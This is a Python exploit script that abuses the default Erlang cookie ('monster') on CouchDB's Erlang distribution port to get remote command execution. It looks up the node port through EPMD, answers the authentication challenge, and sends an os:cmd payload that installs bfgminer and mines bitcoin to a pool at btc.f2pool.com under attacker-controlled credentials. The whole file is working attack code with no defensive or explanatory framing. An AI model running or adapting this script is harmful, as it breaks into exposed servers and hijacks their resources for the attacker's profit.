import socket
from hashlib import md5
import struct
import sys
import re
import time

EPMD_PORT = 4369 # Default Erlang distributed port
COOKIE = "monster" # Default Erlang cookie for CouchDB 
ERLNAG_PORT = 0
EPM_NAME_CMD = b"\x00\x01\x6e" # Request for nodes list

# Some data:
NAME_MSG  = b"\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA"
CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"
CTRL_DATA  = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"
CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"


def compile_cmd(CMD):
    MSG  = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
    MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    MSG += struct.pack(">H", len(CMD))
    MSG += bytes(CMD, 'ascii')
    MSG += b'jw\x04user'
    PAYLOAD = b'\x70' + CTRL_DATA + MSG
    PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD
    return PAYLOAD


# Connect to EPMD:
try:
    epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    epm_socket.connect((sys.argv[1], EPMD_PORT))
except socket.error as msg:
    sys.exit(1)
    
epm_socket.send(EPM_NAME_CMD) #request Erlang nodes
if epm_socket.recv(4) == b'\x00\x00\x11\x11': # OK
    data = epm_socket.recv(1024)
    data = data[0:len(data) - 1].decode('ascii')
    data = data.split("\n")
    choise = 1
        
    ERLNAG_PORT = int(re.search("\d+$",data[choise - 1])[0])
else:
    sys.exit(1)
epm_socket.close()

# Connect to Erlang port:
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], ERLNAG_PORT))
except socket.error as msg:
    sys.exit(1)
   
s.send(NAME_MSG)
s.recv(5)                    # Receive "ok" message
challenge = s.recv(1024)     # Receive "challenge" message
challenge = struct.unpack(">I", challenge[9:13])[0]

#print("Extracted challenge: {}".format(challenge))

# Add Challenge Digest
CHALLENGE_REPLY += md5(bytes(COOKIE, "ascii")
    + bytes(str(challenge), "ascii")).digest()
s.send(CHALLENGE_REPLY)
CHALLENGE_RESPONSE = s.recv(1024)

if len(CHALLENGE_RESPONSE) == 0:
    sys.exit(1)

s.send(compile_cmd('nohup ```apt-get update; apt-get install bfgminer -y; bfgminer -o  stratum+tcp://btc.f2pool.com:3333 -u prctblminimum2.cdbb'+sys.argv[2]+' -p uqkrubeatswv ``` > /dev/null'))